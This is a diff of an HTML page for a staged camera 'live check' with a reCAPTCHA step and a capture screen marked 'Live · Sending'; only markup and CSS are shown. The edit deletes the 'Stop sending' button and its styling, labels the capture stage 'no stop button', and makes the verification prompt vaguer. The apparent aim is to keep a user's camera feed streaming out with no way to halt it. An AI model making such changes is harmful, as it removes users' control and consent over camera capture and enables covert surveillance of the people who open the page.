@@ -1,4 +1,4 @@
-  <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -85,19 +85,6 @@
     cursor: pointer; transition: all 0.25s ease;
     box-shadow: 0 8px 24px rgba(59, 130, 246, 0.35);
     letter-spacing: 0.2px;
-  }
-  .btn:hover:not(:disabled) {
-    transform: translateY(-2px);
-    box-shadow: 0 12px 32px rgba(59,130,246,0.5);
-    filter: brightness(1.1);
-  }
-  .btn:disabled { background:#334155; box-shadow:none;
-    cursor:not-allowed; opacity:0.55; }
-
-  .btn-stop {
-    background: linear-gradient(135deg, #ef4444, #b91c1c);
-    box-shadow: 0 8px 24px rgba(239, 68, 68, 0.35);
-    margin-top: 16px;
   }
 
   #recaptchaContainer {
@@ -216,14 +203,14 @@
     <div id="stageRecaptcha" class="stage">
       <div class="ico">🛡️</div>
       <h2>Camera ready</h2>
-      <p class="desc">Verify you're human to start the live check.</p>
+      <p class="desc">Verify you're human to continue.</p>
 
       <div id="recaptchaContainer">
         <div id="recaptchaWidget"></div>
       </div>
     </div>
 
-    <!-- STAGE 4: capture -->
+    <!-- STAGE 4: capture (no stop button) -->
     <div id="stageCapture" class="stage">
       <div class="live-badge"><span class="dot"></span> Live · Sending</div>
 
@@ -235,8 +222,6 @@
       <div class="status" id="stageStatus">Starting…</div>
 
       <div class="log" id="log"></div>
-
-      <button class="btn btn-stop" id="btnStop">Stop sending</button>
     </div>
 
   </div>
